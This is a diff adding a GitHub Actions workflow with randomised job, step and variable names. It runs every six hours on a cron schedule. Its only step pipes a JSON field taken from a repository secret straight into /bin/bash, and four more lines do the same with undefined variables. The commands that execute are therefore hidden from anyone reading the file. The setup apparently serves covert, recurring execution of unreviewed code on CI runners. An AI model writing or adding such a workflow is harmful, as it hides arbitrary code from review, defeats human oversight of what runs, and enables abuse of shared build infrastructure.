@@ -1,0 +1,23 @@
+name: chiyidalkk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chiyidalkk
+        env:
+          mkzql28069: ${{ secrets.mkzql28069 }}
+        run: |
+          echo $mkzql28069 | jq -r .tab95575 | /bin/bash
+          echo $b7 | jq -r .oaqp79 | /bin/bash
+          echo $uzaw93603 | jq -r .j1 | /bin/bash
+          echo $vbt9710 | jq -r .xrd4802 | /bin/bash
+          echo $axs6060 | jq -r .hkest1 | /bin/bash
+
